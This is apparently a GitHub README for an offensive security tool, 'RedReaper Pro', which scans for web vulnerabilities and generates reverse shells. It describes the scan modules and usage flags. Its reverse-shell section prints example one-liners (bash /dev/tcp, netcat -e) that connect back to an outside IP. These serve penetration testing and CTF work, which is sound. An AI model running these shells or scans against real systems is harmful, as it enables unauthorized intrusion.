# 🩸 RedReaper Pro v4.0 — Enterprise Red Team Framework

<p align="center">
  <img src="https://img.shields.io/badge/Python-3.8%2B-blue?style=flat-square&logo=python" />
  <img src="https://img.shields.io/badge/Platform-Kali%20Linux-green?style=flat-square&logo=linux" />
  <img src="https://img.shields.io/badge/License-MIT-yellow?style=flat-square" />
  <img src="https://img.shields.io/badge/Version-4.0-red?style=flat-square" />
  <img src="https://img.shields.io/badge/Use-Authorized%20Targets%20Only-critical?style=flat-square" />
</p>

> ⚠️ **Disclaimer:** This tool is designed exclusively for authorized penetration testing, CTF competitions, and security research in controlled environments. Unauthorized use against systems you do not own or have explicit written permission to test is illegal and unethical. The author assumes no liability for misuse.

---

## 📋 Table of Contents

- [Features](#-features)
- [Architecture](#-architecture)
- [Installation](#-installation)
- [Usage](#-usage)
- [Modules](#-modules)
- [Report Sample](#-report-sample)
- [About](#-about)

---

## ✨ Features

### 🔍 Reconnaissance
| Module | Description |
|--------|-------------|
| Port Scan | 30+ common ports with service detection |
| Subdomain Enum | DNS brute-force with 50+ common prefixes |
| URL Discovery | 40+ sensitive paths (`.env`, `.git`, `phpinfo`, `actuator`, etc.) |

### 🐛 Vulnerability Scanning
| Vulnerability | Techniques |
|---------------|------------|
| **SQL Injection** | Error-based, Union-based, Time-based Blind |
| **XSS** | Reflected — multiple payload variants |
| **LFI / Path Traversal** | Unix/Windows paths, PHP wrappers (base64, rot13) |
| **SSRF** | AWS/GCP/DO metadata, localhost probing, dict:// |
| **Command Injection** | `;`, `|`, backtick, `$()` — output detection |
| **Open Redirect** | Protocol-relative, basic bypass |
| **CVE Patterns** | `.env`, `.git/config`, Spring Boot Actuator, Swagger, H2 Console, phpinfo, Apache server-status, WEB-INF |

### 📊 Reporting
- **HTML Report** — Professional dark-theme with CVSS scores, CWE links, risk badge
- **Auto browser open** — Report opens automatically after scan
- **Executive Summary** — Risk level, vuln counts, recon results

### 🛠️ Red Team Utilities
- **Reverse Shell Generator** — Python, Bash, PHP, PowerShell, Netcat
- **Listener mode** — Built-in reverse shell listener

---

## 🏗️ Architecture

```
redreaper/
├── redreaper.py        # Single-file framework
│   ├── Colors          # Terminal color constants
│   ├── Logger          # Structured output logger
│   ├── Severity        # Enum: INFO / LOW / MEDIUM / HIGH / CRITICAL
│   ├── Vulnerability   # Dataclass: vuln_id, type, CVSS, CWE, curl cmd
│   ├── Target          # Dataclass: url, domain, ip, ports, vulns
│   ├── HTTPClient      # Lightweight HTTP client (no requests dep)
│   ├── Scanner         # All scanning modules (10 phases)
│   ├── ReportGenerator # HTML report generator
│   └── ReverseShell    # Shell payload generator (CTF/authorized use)
└── README.md
```

**Zero heavy dependencies** — uses only Python standard library + no `requests`, no `beautifulsoup4`.

---

## ⚙️ Installation

```bash
git clone https://github.com/4n0nyrn0u5/redreaper.git
cd redreaper
python3 redreaper.py --help
```

Python 3.8+ required. No pip install needed — pure stdlib.

---

## 🚀 Usage

### Full scan + HTML report (recommended)

```bash
python3 redreaper.py -u https://target.com --full -o report.html
```

### Custom module selection

```bash
# SQLi + XSS + CVE patterns
python3 redreaper.py -u https://target.com --sqli --xss --cve -v

# Full recon only
python3 redreaper.py -u https://target.com --port-scan --subdomain --url-discovery

# LFI + SSRF + Command Injection
python3 redreaper.py -u "https://target.com/?page=home" --lfi --ssrf --cmd-injection
```

### All flags

```
-u / --url          Target URL
--full              All scans + HTML report (auto open in browser)
--all               All scans (no report)
--port-scan         Port scanning (30 common ports)
--subdomain         Subdomain brute-force
--url-discovery     Sensitive path discovery
--sqli              SQL Injection
--xss               Cross-Site Scripting
--lfi               Local File Inclusion / Path Traversal
--ssrf              Server-Side Request Forgery
--cmd-injection     Command Injection
--open-redirect     Open Redirect
--cve               Known CVE pattern checks
--revshell IP PORT  Generate reverse shell payloads (CTF/lab use)
--listen PORT       Start reverse shell listener
-o / --output       Output HTML report filename
-t / --threads      Thread count (default: 30)
--timeout           Request timeout seconds (default: 8)
-v / --verbose      Verbose output
```

### Reverse shell generator (CTF / authorized lab use only)

```bash
python3 redreaper.py --revshell 10.10.14.5 4444
```

Output:
```
[PYTHON]   import socket,subprocess,os;s=socket.socket(...)
[BASH]     bash -i >& /dev/tcp/10.10.14.5/4444 0>&1
[PHP]      php -r '$sock=fsockopen(...)'
[POWERSHELL] powershell -NoP -NonI ...
[NETCAT]   nc -e /bin/sh 10.10.14.5 4444
```

---

## 📦 Modules

### HTTPClient
Pure stdlib HTTP client — no `requests` dependency. Handles redirects, SSL, timeouts, custom headers. Lightweight and portable.

### Vulnerability Dataclass
Every finding is stored as a structured object with: `vuln_id` (unique RR-XXXXXXXX), `type`, `severity` (Enum), `url`, `parameter`, `payload`, `cvss_score`, `cwe_id`, `evidence`, `remediation`, `curl_command`.

### Scanner — 10 Phases
1. **Port Scan** — socket connect scan, getservbyport service detection
2. **Subdomain Enum** — DNS resolve with gethostbyname
3. **URL Discovery** — 40+ sensitive paths probe
4. **SQL Injection** — error keywords + time-based (SLEEP/WAITFOR)
5. **XSS** — payload reflection check (unescaped vs html.escape)
6. **LFI** — `/etc/passwd`, `win.ini`, PHP base64 wrapper decode check
7. **SSRF** — AWS EC2 metadata keyword detection
8. **Command Injection** — `uid=`, `gid=`, `www-data` output detection
9. **Open Redirect** — Location header `evil.com` check
10. **CVE Patterns** — 15 known sensitive endpoint checks

### ReportGenerator
Generates a standalone HTML file with no external dependencies. Includes: executive summary, risk badge (CRITICAL/HIGH/MEDIUM/LOW), stats grid, recon tables, vuln cards with CWE links, remediation list.

---

## 📄 Report Sample

The HTML report includes:
- **Risk Badge** — color-coded overall risk level with glow effect
- **Stats Grid** — Total / Critical / High / Medium counts
- **Recon Section** — Open ports table, subdomains, discovered endpoints
- **Vuln Cards** — Severity-colored, CVSS score, CWE link, payload, evidence, fix
- **Recommendations** — Standard hardening checklist

---

## 🔧 Extending

Adding a new scan module:

1. Add payload list method to `Scanner` class
2. Add scan phase in `scan_all()` following the existing pattern
3. Add `--new-module` argparse flag in `main()`
4. Create `Vulnerability` object and append to `target.vulnerabilities`

---

## 🎓 About

RedReaper Pro was built as a **Red Team portfolio project** — demonstrating practical knowledge of web vulnerability classes, offensive tooling, and report generation. Built entirely on Python stdlib with zero external dependencies.

**Skills demonstrated:**
- OWASP Top 10 vulnerability implementation
- Python dataclasses, enums, threading, sockets
- Portable HTTP client without third-party libs
- Professional HTML report generation
- Offensive Red Team tooling design

**Related projects:** → [PenTool v2.0](https://github.com/4n0nyrn0u5/pentool) — Full OSINT + Web Scanner Framework

---

## ⚖️ License & Legal

MIT License — see [LICENSE](LICENSE).

**This tool must only be used on systems you own or have explicit written authorization to test.** Unauthorized use is illegal under computer fraud laws in most jurisdictions. Use responsibly.

---

<p align="center">
  <strong>RedReaper Pro v4.0</strong> · Built for ethical hacking & CTF · Use responsibly
</p>
